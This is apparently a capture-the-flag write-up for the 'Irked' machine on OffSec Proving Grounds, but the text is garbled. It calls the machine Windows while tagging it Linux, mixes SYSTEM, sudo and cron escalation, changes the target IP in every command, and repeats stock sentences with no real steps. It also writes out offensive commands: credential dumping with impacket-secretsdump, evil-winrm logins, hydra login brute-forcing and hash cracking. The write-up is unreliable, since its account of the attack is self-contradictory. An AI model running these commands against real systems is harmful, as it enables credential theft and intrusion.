---
TitleSEO: "OffSec Proving Grounds — Irked (Medium Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Irked (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Irked. Command Injection and Constrained Delegation to achieve medium compromise on Windows."
Keywords: "offsec, linux, forensics"
URL: "https://zurefx.github.io/writeups/htb-irked-753.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-irked-753/"
Date: "2024-12-24"
Tags: "OffSec, Linux, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-irked-753"
Permalink: "/writeups/htb-irked-753.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Irked** is rated **Medium** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.80.115.195`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.123.151.234
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.60.235
evil-winrm -i 10.79.153.239 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.253.95
```

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

### SMB Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

Key finding: **Constrained Delegation**.

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.35.171.68 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p445,5986,143 10.62.105.111 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.243.67 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

### Exploitation

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.196.142 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `wmiexec`
- `sharphound`
- `nikto`
- `netcat`
- `nmap`
- `chisel`
- `wpscan`
- `evil-winrm`

### Key Takeaways

- Command Injection
- Constrained Delegation
- Cron Job
